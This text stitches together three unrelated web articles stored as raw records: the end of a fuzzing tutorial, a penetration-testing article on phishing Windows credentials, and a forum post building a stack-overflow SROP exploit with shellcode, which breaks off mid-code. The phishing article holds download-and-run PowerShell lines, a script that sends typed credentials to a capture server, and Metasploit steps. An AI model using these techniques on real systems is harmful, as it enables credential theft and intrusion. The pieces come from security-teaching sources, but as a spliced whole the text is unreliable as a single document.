(passing any input received via stdin to the instrumented binary\nvia stdin) and print a report of the feedback it sees during program\nexecution.\n# afl-showmap -o \/dev\/null -- ~\/parse < <(echo hi)\nafl-showmap 2.03b by <lcamtuf@google.com>\n[*] Executing '~\/parse'...\n-- Program output begins --\nhi\n-- Program output ends --\n[+] Captured 1787 tuples in '\/dev\/null'.\n#\nBy changing the input to something that should exercise new code paths,\nyou should see the number of tuples reported at the end of the report\ngrow or shrink.\n# afl-showmap -o \/dev\/null -- ~\/parse < <(echo hi: blah)\nafl-showmap 2.03b by <lcamtuf@google.com>\n[*] Executing '~\/parse'...\n-- Program output begins --\nhi: blah\n-- Program output ends --\n[+] Captured 2268 tuples in '\/dev\/null'.\n#\nAs you can see, sending a simple YAML key (hi) expressed only 1787\ntuples of feedback, but a YAML key with a value (hi: blah) expressed\n2268 tuples of feedback. We should be good to go with the instrumented\nbinary, now we need the testcases to seed our fuzzing with.\nSeeding with high quality test cases\nThe testcases you initially seed your fuzzers with is one of, if not\nthe, most significant aspect of whether you will see a fuzz run come up\nwith some good crashes or not. As stated previously, the specexamples.h\nfile in the yaml-cpp test directory has excellent test cases for us to\nstart with, but they can be even better. For this job, I manually\ncopied and pasted the examples from the header file into testcases to\nuse, so to save the reader time, [16]linked here are the original seed\nfiles I used, for reproduction purposes.\nAFL ships with two tools we can used to ensure that:\n* The files in the test corpus are as efficiently unique as possible\n* Each test file expresses its unique code paths as efficiently as\npossible\nThe two tools, afl-cmin and afl-tmin, perform what is called\nminimizing. Without being too technical (this is a technical blog,\nright?), afl-cmin takes a given folder of potential test cases, then\nruns each one and compares the feedback it receives to all rest of the\ntestcases to find the best testcases which most efficiently express the\nmost unique code paths. The best testcases are saved to a new\ndirectory.\nThe afl-tmin tool, on the other hand, works on only a specified file.\nWhen we are fuzzing, we don\u2019t want to waste CPU cycles fiddling with\nbits and bytes that are useless relative to the code paths the testcase\nmight express. In order to minimize each testcase to the bare minimum\nrequired to express the same code paths as the original testcase,\nafl-tmin iterates over the actual bytes in the testcases, removing\nprogressively smaller and smaller chunks of data until it has a removed\nany bytes that don\u2019t affect the code paths taken. It\u2019s a bit much, but\nthese are very important steps to efficiently fuzzing and they are\nimportant concepts to understand. Let\u2019s see an example.\nIn the git repo I created with the [17]raw testcases from the\nspecexamples.h file, we can start with the [18]2 file.\n# afl-tmin -i 2 -o 2.min -- ~\/parse\nafl-tmin 2.03b by <lcamtuf@google.com>\n[+] Read 80 bytes from '2'.\n[*] Performing dry run (mem limit = 50 MB, timeout = 1000 ms)...\n[+] Program terminates normally, minimizing in instrumented mode.\n[*] Stage #0: One-time block normalization...\n[+] Block normalization complete, 36 bytes replaced.\n[*] --- Pass #1 ---\n[*] Stage #1: Removing blocks of data...\nBlock length = 8, remaining size = 80\nBlock length = 4, remaining size = 80\nBlock length = 2, remaining size = 76\nBlock length = 1, remaining size = 76\n[+] Block removal complete, 6 bytes deleted.\n[*] Stage #2: Minimizing symbols (22 code points)...\n[+] Symbol minimization finished, 17 symbols (21 bytes) replaced.\n[*] Stage #3: Character minimization...\n[+] Character minimization done, 2 bytes replaced.\n[*] --- Pass #2 ---\n[*] Stage #1: Removing blocks of data...\nBlock length = 4, remaining size = 74\nBlock length = 2, remaining size = 74\nBlock length = 1, remaining size = 74\n[+] Block removal complete, 0 bytes deleted.\nFile size reduced by : 7.50% (to 74 bytes)\nCharacters simplified : 79.73%\nNumber of execs done : 221\nFruitless execs : path=189 crash=0 hang=0\n[*] Writing output to '2.min'...\n[+] We're done here. Have a nice day!\n# cat 2\nhr: 65 # Home runs\navg: 0.278 # Batting average\nrbi: 147 # Runs Batted In\n# cat 2.min\n00: 00 #00000\n000: 00000 #0000000000000000\n000: 000 #000000000000000\n#\nThis is a great example of how powerful AFL is. AFL has no idea what\nYAML is or what its syntax looks like, but it effectively was able to\nzero out all the characters that weren\u2019t special YAML characters used\nto denote key value pairs. It was able to do this by determining that\nchanging those specific characters would alter the feedback from the\ninstrumented binary dramatically, and they should be left alone. It\nalso removed four bytes from the original file that didn\u2019t affect the\ncode paths taken, so that is four less bytes we will be wasting CPU\ncycles on.\nIn order to quickly minimize a starting test corpus, I usually use a\nquick for loop to minimize each one to a new file with a special file\nextension of .min.\n# for i in *; do afl-tmin -i $i -o $i.min -- ~\/parse; done;\n# mkdir ~\/testcases && cp *.min ~\/testcases\nThis for loop will iterate over each file in the current directory, and\nminimize it with afl-tmin to a new file with the same name as the\nfirst, just with a .min appended to it. This way, I can just cp *.min\nto the folder I will use to seed AFL with.\nStarting the fuzzers\nThis is the section where most of the fuzzing walkthroughs end, but I\nassure you, this is only the beginning! Now that we have a high quality\nset of testcases to seed AFL with, we can get started. Optionally, we\ncould also take advantage of the dictionary token functionality to seed\nAFL with the YAML special characters to add a bit more potency, but I\nwill leave that as an exercise to the reader.\nAFL has two types of fuzzing strategies, one that is deterministic and\none that is random and chaotic. When starting afl-fuzz instances, you\ncan specify which type of strategy you would like that fuzz instance to\nfollow. Generally speaking, you only need one deterministic (or master)\nfuzzer, but you can have as many random (or slave) fuzzers as your box\ncan handle. If you have used AFL in the past and don\u2019t know what this\nis talking about, you may have only run a single instance of afl-fuzz\nbefore. If no fuzzing strategy is specified, then the afl-fuzz instance\nwill switch back and forth between each strategy.\n# screen afl-fuzz -i testcases\/ -o syncdir\/ -M fuzzer1 -- .\/parse\n# screen afl-fuzz -i testcases\/ -o syncdir\/ -S fuzzer2 -- .\/parse\nFirst, notice how we start each instance in a screen session. This\nallows us to connect and disconnect to a screen session running the\nfuzzer, so we don\u2019t accidentally close the terminal running the\nafl-fuzz instance! Also note the arguments -M and -S used in each\nrespective command. By passing -M fuzzer1 to afl-fuzz, I am telling it\nto be a Master fuzzer (use the deterministic strategy) and the name of\nthe fuzz instance is fuzzer1. On the other hand, the -S fuzzer2 passed\nto the second command says to run the instance with a random, chaotic\nstrategy and with a name of fuzzer2. Both of these fuzzers will work\nwith each other, passing new test cases back and forth to each other as\nnew code paths are found.\nWhen to stop and prune\nOnce the fuzzers have run for a relatively extended period of time (I\nlike to wait until the Master fuzzer has completed it\u2019s first cycle at\nthe very least, the Slave instances have usually completed many cycles\nby then), we shouldn\u2019t just stop the job and start looking at the\ncrashes. During fuzzing, AFL has hopefully created a huge corpus of new\ntestcases that could still have bugs lurking in them. Instead of\nstopping and calling it a day, we should minimize this new corpus as\nmuch as possible, then reseed our fuzzers and let them run even more.\nThis is the process that no walkthroughs talk about because it is\nboring, tedious, and can take a long time, but it is crucial to\nhighly-effective fuzzing. Patience and hard work are virtues.\nOnce the Master fuzzer for the yaml-cpp parse binary has completed it\u2019s\nfirst cycle (it took about 10 hours for me, it might take 24 for an\naverage workstation), we can go ahead and stop our afl-fuzz instances.\nWe need to consolidate and minimize each instance\u2019s queues and restart\nthe fuzzing again. While running with multiple fuzzing instances, AFL\nwill maintain a separate sync directory for each fuzzer inside of the\nroot syncdir your specify as the argument to afl-fuzz. Each individual\nfuzzer syncdir contains a queue directory with all of the test cases\nthat AFL was able to generate that lead to new code paths worth\nchecking out.\nWe need to consolidate each fuzz instance\u2019s queue directory, as there\nwill be a lot of overlap, then minimize this new body of test data.\n# cd ~\/syncdir\n# ls\nfuzzer1 fuzzer2\n# mkdir queue_all\n# cp fuzzer*\/queue\/* queue_all\/\n# afl-cmin -i queue_all\/ -o queue_cmin -- ~\/parse\ncorpus minimization tool for afl-fuzz by <lcamtuf@google.com>\n[*] Testing the target binary...\n[+] OK, 884 tuples recorded.\n[*] Obtaining traces for input files in 'queue_all\/'...\nProcessing file 1159\/1159...\n[*] Sorting trace sets (this may take a while)...\n[+] Found 34373 unique tuples across 1159 files.\n[*] Finding best candidates for each tuple...\nProcessing file 1159\/1159...\n[*] Sorting candidate list (be patient)...\n[*] Processing candidates and writing output files...\nProcessing tuple 34373\/34373...\n[+] Narrowed down to 859 files, saved in 'queue_cmin'.\nOnce we have run the generated queues through afl-cmin, we need to\nminimize each resulting file so that we don\u2019t waste CPU cycles on bytes\nwe don\u2019t need. However, we have quite a few more files now than when we\nwere just minimizing our starting testcases. A simple for loop for\nminimizing thousands of files could potentially take days and ain\u2019t no\none got time for that. Over time, I wrote a small bash script called\nafl-ptmin which parallelizes afl-tmin into a set number of processes\nand has proven to be a significant speed boost in minimizing.\n#!\/bin\/bash\ncores=$1\ninputdir=$2\noutputdir=$3\npids=\"\"\ntotal=`ls $inputdir | wc -l`\nfor k in `seq 1 $cores $total`\ndo\nfor i in `seq 0 $(expr $cores - 1)`\ndo\nfile=`ls -Sr $inputdir | sed $(expr $i + $k)\"q;d\"`\necho $file\nafl-tmin -i $inputdir\/$file -o $outputdir\/$file -- ~\/parse &\ndone\nwait\ndone\nAs with the afl-fuzz instances, I recommend still running this in a\nscreen session so that no network hiccups or closed terminals cause you\npain and anguish. It\u2019s usage is simple, taking only three arguments,\nthe number processes to start, the directory with the testcases to\nminimize, and the output directory to write the minimized test cases\nto.\n# screen ~\/afl-ptmin 8 .\/queue_cmin\/ .\/queue\/\nEven with parallelization, this process can still take a while (24\nhours+). For our corpus generated with yaml-cpp, it should be able to\nfinish in an hour or so. Once done, we should remove the previous queue\ndirectories from the individual fuzzer syncdirs, then copy the queue\/\nfolder to replace the old queue folder.\n# rm -rf fuzzer1\/queue\n# rm -rf fuzzer2\/queue\n# cp -r queue\/ fuzzer1\/queue\n# cp -r queue\/ fuzzer2\/queue\nWith the new minimized queues in place, we can begin fuzzing back where\nwe left off.\n# cd ~\n# screen afl-fuzz -i- -o syncdir\/ -S fuzzer2 -- .\/parse\n# screen afl-fuzz -i- -o syncdir\/ -M fuzzer1 -- .\/parse\nIf you notice, instead of passing the -i argument a directory to read\ntestcases from each time we call afl-fuzz, we simply pass a hyphen.\nThis tells AFL to just use the queue\/ directory in the syncdir for that\nfuzzer as the seed directory and start back up from there.\nThis entire process starting the fuzz jobs, then stopping to minimize\nthe queues and restarting the jobs can be done as many times as you\nfeel it necessary (usually until you get bored or just stop finding new\ncode paths). It should also be done often because otherwise you are\nwasting your electricity bill on bytes that aren\u2019t going to pay you\nanything back later.\nTriaging your crashes\nAnother traditionally tedious part of the fuzzing lifecycle has been\ntriaging your findings. Luckily, some great tools have been written to\nhelp us with this.\nA great tool is [19]crashwalk, by [20]@rantyben (props!). It automates\ngdb and a special gdb plugin to quickly determine which crashes may\nlead to exploitable conditions or not. This isn\u2019t fool proof by any\nmeans, but does give you a bit of a head start in which crashes to\nfocus on first. Installing it is relatively straight-forward, but we\nneed a few dependencies first.\n# apt-get install gdb golang\n# mkdir src\n# cd src\n# git clone [21]https:\/\/github.com\/jfoote\/exploitable.git\n# cd && mkdir go\n# export GOPATH=~\/go\n# go get -u github.com\/bnagy\/crashwalk\/cmd\/\u2026\nWith crashwalk installed in ~\/go\/bin\/, we can automatically analyze the\nfiles and see if they might lead to exploitable bugs.\n# ~\/go\/bin\/cwtriage -root syncdir\/fuzzer1\/crashes\/ -match id -- ~\/parse @@\nDetermining your effectiveness and code coverage\nFinding crashes is great fun and all, but without being able to\nquantify how well you are exercising the available code paths in the\nbinary, you are doing nothing but taking shots in the dark and hoping\nfor a good result. By determining which parts of the code base you\naren\u2019t reaching, you can better tune your testcase seeds to hit the\ncode you haven\u2019t been able to yet.\nAn excellent tool (developed by [22]@michaelrash) called [23]afl-cov\ncan help you solve this exact problem by watching your fuzz directories\nas you find new paths and immediately running the testcase to find any\nnew coverage of the codebase you may have hit. It accomplishes this\nusing lcov, so we must actually recompile our parse binary with some\nspecial options before continuing.\n# cd ~\/yaml-cpp\/build\/\n# rm -rf .\/*\n# cmake -DCMAKE_CXX_FLAGS=\"-O0 -fprofile-arcs -ftest-coverage\" \\\n-DCMAKE_EXE_LINKER_FLAGS=\"-fprofile-arcs -ftest-coverage\" ..\n# make\n# cp util\/parse ~\/parse_cov\nWith this new parse binary, afl-cov can link what code paths are taken\nin the binary with a given input with the code base on the file system.\n# screen afl-cov\/afl-cov -d ~\/syncdir\/ --live --coverage-cmd \"~\/parse_cov AFL_FI\nLE\" --code-dir ~\/yaml-cpp\/\nOnce finished, afl-cov generates report information in the root syncdir\nin a directory called cov. This includes HTML files that are easily\nviewed in a web browser detailing which functions and lines of code\nwere hit, as well as with functions and lines of code were not hit.\nIn the end\nIn the three days it took to flesh this out, I found no potentially\nexploitable bugs in yaml-cpp. Does that mean that no bugs exist and\nit\u2019s not worth fuzzing? Of course not. In our industry, I don\u2019t believe\nwe publish enough about our failures in bug hunting. Many people may\nnot want to admit that they put a considerable amount of effort and\ntime into something that came up as what others might consider\nfruitless. In the spirit of openness, linked below are all of the\ngenerated corpus (fully minimized), seeds, and code coverage results\n(~70% code coverage) so that someone else can take them and determine\nwhether or not it\u2019s worthy to pursue the fuzzing.\n[24]https:\/\/github.com\/bperryntt\/yaml-fuzz\nShare this:\n* [25]Twitter\n* [26]Facebook\n*\nLike Loading...\nRelated\nPost navigation\n[27]Previous Previous post: When Whales Fly \u2013 Building a Wireless\nPentest Environment using Docker\n[28]Next Next post: Why DoS isn\u2019t compromise \u2013 5 Years of Real\nPenetration Test Data to Stand Behind\nMenu\n* [29]Blog\n* [30]About FoxGlove Security\n* [31]The Team\n[32]Blog at WordPress.com.\n* [33]Reblog\n* [34]Subscribe [35]Subscribed\n+ [36]foxglovesecurity.com\nJoin 214 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [37]Log in now.\n*\n+ [38]foxglovesecurity.com\n+ [39]Customize\n+ [40]Subscribe [41]Subscribed\n+ [42]Sign up\n+ [43]Log in\n+ [44]Copy shortlink\n+ [45]Report this content\n+ [46]View post in Reader\n+ [47]Manage subscriptions\n+ [48]Collapse this bar\nIFRAME: [49]likes-master\n%d"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Phishing Windows Credentials\nComments Feed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]March 2, 2020March 1, 2020\nPhishing Windows Credentials\nby [28]Administrator.In [29]Credential Access.[30]Leave a Comment on\nPhishing Windows Credentials\nIt is very common in Windows environments when programs are executed to\nrequire from the user to enter his domain credentials for\nauthentication like Outlook, authorization of elevation of privileges\n(User Account Control) or simply when Windows are inactive (Lock\nScreen). Mimic this behavior of Windows can lead to harvest credentials\nof Windows users that could be used for lateral movement during red\nteam assessments. This technique can be useful when initial foothold\nhas been achieved on the system and credentials of the user cannot be\ndiscovered by alternative methods.\nC#\nModern red teaming technique require tradecraft to be based in C#\nlanguage since it allows in-memory execution by various frameworks such\nas Cobalt Strike, Covenant etc. The [31]FakeLogonScreen is a Windows\nutility that was developed in C# by [32]Arris Huijgen that will mimic\nWindows logon screen in an attempt to obtain the password of the\ncurrent user.\nFakdLogonScreen\nThe tool has the ability to show the background that is currently\nconfigured in order to reduce the risk of security conscious users to\nspot this malicious operation.\nWindows Fake Logon Screen\nWhen the user enter his password on the fake logon screen it will\nperform a validation against the Active Directory or locally to ensure\nthat the password is correct. The password will be displayed in the\nconsole.\nFake Logon Screen \u2013 Credentials\nThere is also a secondary binary which is part of the project and\nstores the credentials to a file (user.db) on local disk. Specifically\nexecuting the following will read the file that contains the\ncredentials of the domain user.\ntype C:\\Users\\pentestlab.PENTESTLAB\\AppData\\Local\\Microsoft\\user.db\nFake Logon Screen \u2013 Credentials Stored\nA similar assembly binary called [33]SharpLocker was developed by\n[34]Matt Pickford that upon execution will show a fake logon screen to\nthe user.\nSharpLocker \u2013 Lock Screen\nEvery single keystroke will be captured on the console until the\npassword of the user is fully uncovered.\nSharpLocker \u2013 Password\nPowerShell\nWindows security input prompts are very common since applications in\ncorporate environments might ask the users in regular basis to\nauthenticate. Microsoft outlook is one product that performs this\nrequest for credentials often in a domain environment. A tool that\nattempts to mimic a Windows security prompt is [35]CredsLeaker which\nrequires a web server to store the necessary files that will read the\ncredentials and write them in a text file and PowerShell to invoke the\nHTTP request. The PowerShell commands can be executed directly from a\nBAT file.\nrun.bat\nCredsLeaker \u2013 HTTP Delivery\nPrior to execution of the BAT file information on the project files\nshould be modified to target the web server that stores the\nconfiguration, PHP and PowerShell files. When the BAT file is executed\na Windows security popup will displayed to the user.\nInput Prompt \u2013 CredsLeaker\nThe tool performs validation against the credentials and the popup will\nonly disappear if supplied credentials are correct. The Domain, the\nhost name, username and password will be written into the following\nlocation.\n\/var\/www\/html\/creds.txt\nCredsLeaker \u2013 Credentials\n[36]Matt Nelson developed a PowerShell [37]script which will spawn an\ninput prompt with capability to check if the credentials are valid as\notherwise the prompt is not closing. The script can be executed from a\nremote location and the credentials will displayed in the console.\npowershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('htt\np:\/\/10.0.0.13\/tmp\/Invoke-LoginPrompt.ps1')); Invoke-LoginPrompt\nWindows Input Prompt \u2013 PowerShell\nNishang framework also contains a PowerShell [38]script that could be\nused to create a fake input prompt in order to harvest windows\ncredentials.\nPowerShell \u2013 Invoke-CredentialsPhish\nThe input prompt will contain a message to the user that credentials\nare required to perform this operation. More security aware users might\nidentify that something has been executed on the background but this is\nnot fully applied to all the corporate users.\nInvoke-CredentialsPhish \u2013 Input Prompt\nWhen credentials of the users are entered into the Windows box these\nwill displayed back to the console.\nPowerShell \u2013 Invoke-CredentialsPhish\nAlternatively the script could be executed from a remote location to\nevade detection.\npowershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('htt\np:\/\/10.0.0.13\/tmp\/Invoke-CredentialsPhish\/ps1')); Invoke-CredentialsPhish\nShell \u2013 Invoke-CredentialsPhish\n[39]Rob Fuller introduced in his [40]blog the attack of capturing\nWindows credentials using a Metasploit module and PowerShell.\nMetasploit Framework contains modules which can capture credentials\nover various protocols (FTP, SMB HTTP etc.).The following module can be\nused in order to set up a basic HTTP server that will require\nauthentication.\nuse auxiliary\/server\/capture\/http_basic\nset URIPATH \/\nPowerShell can be used to deploy the attack of phishing windows\ncredentials by creating an input prompt and use the credentials to\ninitiate an HTTP request to the Metasploit server so the credentials\ncould be captured.\n$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U\nserDomainName + \"\\\" + [Environment]::UserName,[Environment]::UserDomainName);[Sy\nstem.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$wc = new-object net.webclient;\n$wc.Headers.Add(\"User-Agent\",\"Wget\/1.9+cvs-stable (Red Hat modified)\");\n$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;\n$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.\ngetnetworkcredential().password, '');\n$result = $wc.downloadstring('http:\/\/10.0.0.13\/');\nThe arbitrary input prompt needs to use UTF-16LE character encoding and\nconverted to Base64.\ncat popup.txt | iconv -t UTF-16LE\ncat popup.txt | iconv -t UTF-16LE | base64 -w0\nPowerShell \u2013 Input Prompt\nExecuting the following from a Windows command prompt or a shell will\ndisplay to the user the fake windows input prompt.\npowershell.exe -ep bypass -enc <base64>\nLogin Screen \u2013 PowerShell\nThe Metasploit module will obtain the request with the credentials.\nMetasploit HTTP Server \u2013 Capture Authentication\nMetasploit\nMetasploit Framework contains a module which has the capability to\nspawn an input prompt when a specific process or any process is\ncreated. The module must be linked into an existing Meterpreter session\nand the process needs to be defined.\nuse post\/windows\/gather\/phish_windows_credentials\nset SESSION 3\nset PROCESS *\nrun\nInput Prompt \u2013 Metasploit Module\nThe wildcard * instructs the module to monitor all the process that are\nrunning on the system and waits for a new instances to start in order\nto display the fake input prompt to the user.\nInput Prompt Metasploit \u2013 All Processes\nThe input prompt will be displayed to the user as a credential request\nfrom the process in order to start.\nWindows Input Prompt\nWhen the user enter his credentials these will be captured and\ndisplayed back to the console.\nMetasploit Module \u2013 Credentials\nAlternatively the module can be configured to monitor only for the\ncreation of a specific process.\nMetasploit Module \u2013 Windows Credentials\nBASH\n[41]Lockphish is another tool with capability to implement a phishing\nattack against the Windows logon screen. The associated template will\nbe hosted into a PHP server and by default uses YouTube in order to\nredirect the user after his credentials have been submitted.\nbash lockphish.sh\nLockPhish \u2013 Installation\nSocial engineering is required in order to trick the user to click the\ndirect link that is hosting the fake logon screen.\nLockPhish \u2013 WebPage\nA fake logon screen will be displayed on the screen of the user that\nwill require the password of the Administrator account. However compare\nto other tools that target the lock screen the alignment of the\npassword field is not accurate and the fact that requires the\nAdministrator account instead of the current user account might alter\nthe user. Furthermore, it doesn\u2019t perform any validation locally or in\nthe active directory.\nLockPhish \u2013 Lock Screen\nOnce the user enter his credentials a redirection will follow to\nYouTube website.\nLockPhish Redirection\nThe credentials will be displayed back in the console.\nLockPhish Credentials\nBinary\nPrior to the C# and PowerShell age this attack was executed from an\narbitrary executable. The binary supported two parameters in order to\nallow the penetration tester to specify the target domain and the file\nname that will store the captured credentials.\nexecute -f \"cmd \/c start OUTLOOK.exe pentestlab.local creds.txt\"\nOUTLOOK Binary\nThe binary was distinguished as an Outlook application (Outlook 2010,\nOutlook 2013) in order to fool the blue team since it was touching the\ndisk. The input prompt was displayed to the user similar to PowerShell\nbased input prompts.\nOUTLOOK \u2013 Input Prompt\nCredentials were stored into a hidden folder inside %AppData% and the\nfollowing commands could be executed from a Meterpreter session to\nexecute the attack and to read the captured credentials.\ncd %AppData%\nupload OUTLOOK.exe\nexecute -f \"cmd \/c start OUTLOOK.exe pentestlab.local creds.txt\"\ncd Local\ncd Temp\ncat creds.txt\nOUTLOOK \u2013 Credentials\nYouTube\nIFRAME:\n[42]https:\/\/www.youtube.com\/embed\/MqLTUZBEliE?version=3&rel=1&showsearc\nh=0&showinfo=1&iv_load_policy=1&fs=1&hl=en&autohide=2&wmode=transparent"}
{"text":"#[1]0x00sec - The Home of the Hacker Search [2]next\n[3]Init [4]Discord [5]Partners\n[6]0x00sec - The Home of the Hacker\n[7]SROP | Signals, you say?\n[8]Exploit Development\n[9]linux, [10]srop, [11]exploit\n[12]exploit (exploit)\nJuly 11, 2017, 7:18pm 1\nSigreturn Oriented Programming\nIn the name of Allah, the most beneficent, the most merciful.\n__________________________________________________________________\n* Hello everyone to a new boring article, after we took a small look\non normal ROP stuff, I decided to write something more fun :smile:\n!\n* [13]@_py is the one that started that idea! :wink:\n* for learning purposes :smiley: \u2026\n* I hope you learn much!\n###What\u2019s so special about SROP?``\nIt needs only a small syscall; ret; gadget, and a way to set EAX to\nsyscall number of sigreturn!\n* While you need much gadgets to ROP, 1 ~ 2 to SROP!\n* Sometimes, you need to combine both :smiley: \u2026\n###How can we SROP?``\n* We want to exploit the weakness that lies in UNIX systems,\nsigreturn()\u2026\n* This function when called, restores all registers from stack, with\nno further checks\u2026\n* We know that the signal form looks like this:\n[0df0da262f0ffab1be896d1c6b6ebce4584e2ef2.gif]\nSolving an x64 simple binary, the SROP way!\n* Suppose we have an overflow ( Nullbytes shouldn\u2019t be removed ),\nallowing us to overwrite the saved RIP\u2026 and a little gadget that\nwill allow us set RAX value to 15 :smile: \u2026\n* We can simply set saved RIP to the gadget, and we build a fake\nsignal frame, that\u2019ll allow us do ANYTHING WE WANT, SINCE WE WILL\nCONTROL ALL REGISTERS :wink: !\n* Let\u2019s write a small binary that contains these ingredients :smiley:\n!\n#include <stdio.h>\n#include <stdlib.h>\nvoid syscall_(){\n__asm__(\"syscall; ret;\");\n}\nvoid set_rax(){\n__asm__(\"movl $0xf, %eax; ret;\");\n}\nint main(){\n\/\/ ONLY SROP!\nchar buff[100];\nprintf(\"Buff @%p, can you SROP?\\n\", buff);\nread(0, buff, 5000);\nreturn 0;\n}\nLet\u2019s start by controlling RIP!\n* We keep filling the stack until we get SIGSEGV, and we subtract one\nfrom it, leading to get the perfect padding! :slight_smile:\n[fdc3d6267be7075df7cbc7106d0324e2a1d42904.png]\n* The padding to saved RIP is 120 :wink: , let\u2019s check it!\n[3ac28738bfeb1fff8e675f113bfa27c83de6556e.png]\n[57b81690b61c02c1f6316d01f865b60c626a1bc5.png]\nWriting the exploit\n* We gained control over RIP, let\u2019s start writing our exploit.py!\n#!\/usr\/bin\/python\nfrom pwn import *\ncontext.clear(arch=\"amd64\")\nc = process(\".\/srop\")\npad = 120\n# EXPLOIT\npayload = \"A\" * pad # FILL STACK TILL SAVED RIP\npayload += \"BBBB\" # OVERWRITING SAVED RIP WITH BBBB\n# SENDING\nc.sendline(payload)\nc.interactive()\n* [14]pwntools\u2026 Always making our life easier :rofl: \u2026\n* Because of pwntools, we won\u2019t write the whole chain ( you can write\nit if you want )! :laughing:\n* Let\u2019s first collect, the useful gadgets for our attack!\n[3c9bb0b45eb4f7fd8d8f64d6290e1402b0a3f9e2.png]\n[608ca4a1b4e6d0d7b916352c1af84adb68fe162f.png]\n# ENTRIES\nsyscall_ret = 0x40054a\nmov_rax_15_ret = 0x400554\n* Also there\u2019s some kind of leak, the address of buff, is something\nwe have!\n* Let\u2019s write a small part to take that leak before sending the\npayload!\n# LEAK\nc.recvuntil(\"@0x\")\nleak = int(c.recvuntil(\",\")[:-1], 16)\nprint \"Buff @ \" + hex(leak)\n[8ba452d1cfb1048bbf3858c354690d94868eb9ea.png]\n* All working good! :smiley:\n* Let\u2019s now start editing the EXPLOIT part!\n* The plan i\u2019m going to do, is to make the Buff address executable,\nand return to it!\n* To do so, i\u2019m going to craft a signalframe that will be able to\ncall mprotect on buff address\u2026\n* We are going to test on an address, and try making it executable!\npause() # STOP TO ATTACH GDB\ntest = 0x601000 # TEST ADDRESS\n# EXPLOIT\npayload = \"A\" * pad # FILLING STACK TO SAVED RIP\npayload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER\npayload += p64(syscall_ret) # CALL SIGRETURN\n# BUILD FAKE FRAME\nframe = SigreturnFrame(kernel=\"amd64\") # CREATING A SIGRETURN FRAME\nframe.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER\nframe.rdi = test # SET RDI TO TEST ADDRESS\nframe.rsi = 2000 # SET RSI TO SIZE\nframe.rdx = 7 # SET RDX => RWX PERMISSION\nframe.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!\nframe.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS\n# PLACE FAKE FRAME ON STACK\npayload += str(frame)\npayload += \"AAAA\" # WHERE IT GOING TO RETURN ( RSP )\nStack is going to look like this:\n[73c128f7d309724ea18993ef18a5b457596170b2.png]\n* Let\u2019s run the exploit and attach it!\n[83ad5067a523cc307eb990cb4b7f33cc181198a0.png]\n* Write \u2018c\u2019 in GDB to continue, and press enter in exploit.py tab to\nresume!\n* BEAAAAAAAAM, RIP in it\u2019s right place, let\u2019s check if the address\nhas now RWX permissions!\n[c1e2260374a098ce76635aee3383b7bd4af9d295.png]\n* RWX! let\u2019s now take advantage of that and instead of test address,\nwe are going to make buff address executable!\npause() # STOP TO ATTACH GDB\nshellcode = \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x5\n4\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" # x86_64 EXECVE SHELLCODE\n# EXPLOIT\npayload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF\npayload = payload.ljust(pad, \"A\") # FILLING STACK TO SAVED RIP\npayload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER\npayload += p64(syscall_ret) # CALL SIGRETURN\n# BUILD FAKE FRAME\nframe = SigreturnFrame(kernel=\"amd64\") # CREATING A SIGRETURN FRAME\nframe.rax = 10 # SET RAX TO MPROTECT SYSCALL NUMBER\nframe.rdi = leak # SET RDI TO BUFF ADDRESS\nframe.rsi = 2000 # SET RSI TO SIZE\nframe.rdx = 7 # SET RDX => RWX PERMISSION\nframe.rsp = leak + len(payload) + 248 # WHERE 248 IS SIZE OF FAKE FRAME!\nframe.rip = syscall_ret # SET RIP TO SYSCALL ADDRESS\n# PLACE FAKE FRAME ON STACK\npayload += str(frame)\npayload += p64(leak) # RETURN2SHELLCODE\n* Let\u2019s run our exploit! :blush:\n[ea5c2fba6a47e5a1d1fe83753673cbdb39d9380d.png]\n* We got our shell, we won :smile: !\nFull exploit\n#!\/usr\/bin\/python\nfrom pwn import *\ncontext.clear(arch=\"amd64\")\nc = process(\".\/srop\")\npad = 120\n# ENTRIES\nsyscall_ret = 0x40054a\nmov_rax_15_ret = 0x400554\n# LEAK\nc.recvuntil(\"@0x\")\nleak = int(c.recvuntil(\",\")[:-1], 16)\nprint \"Buff @ \" + hex(leak)\npause() # STOP TO ATTACH GDB\nshellcode = \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x5\n4\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" # x86_64 EXECVE SHELLCODE\n# EXPLOIT\npayload = shellcode # PLACING SHELLCODE IN BEGINNING OF BUFF\npayload = payload.ljust(pad, \"A\") # FILLING STACK TO SAVED RIP\npayload += p64(mov_rax_15_ret) # SET RAX TO SIGRETURN SYSCALL NUMBER\npayload += p64(syscall_ret) # CALL SIGRETURN\n# BUILD FAKE 